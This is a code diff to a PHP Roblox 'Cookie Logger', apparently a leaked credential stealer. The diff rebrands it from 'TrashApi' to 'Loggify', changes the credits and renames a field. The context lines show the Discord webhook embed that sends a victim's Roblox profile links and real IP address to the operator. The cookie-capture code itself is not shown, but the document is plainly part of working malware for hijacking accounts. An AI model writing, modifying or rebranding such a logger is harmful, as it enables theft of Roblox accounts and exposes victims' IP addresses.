@@ -76,7 +76,7 @@
             "avatar_url" => "",
             "embeds" => [
                 [
-                    "title" => '"TrashApi" Cookie Logger',
+                    "title" => '"Loggify" Cookie Logger',
                     "type" => "rich",
                     "description" => "",
                     "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
@@ -86,7 +86,7 @@
                         "url" => "https://www.roblox.com/bust-thumbnail/image?userId=" . $profile["UserID"] . "&width=420&height=420&format=png"
                     ],
                     "footer" => [
-                        "text" => "Leaked by icorex",
+                        "text" => "Thanks, Icorex. modified by https://github.com/qertyuiop12345678",
                         "icon_url" => "https://images-ext-1.discordapp.net/external/2-ODqiHvU9tAQEvrhsMPM4Jhk3-Goit0kYdq5gTPlEI/https/cdn.discordapp.com/icons/796867055889678346/7445f9e5cadf02b020c24210ae535d41.png"
                     ],
                     "fields" => [
@@ -111,7 +111,7 @@
                             "value" => "https://www.rolimons.com/player/" . $profile["UserID"]
                         ],
                         [
-                            "name" => "IP",
+                            "name" => "IP Adresse",
                             "value" => realIP()
                         ],
                         [
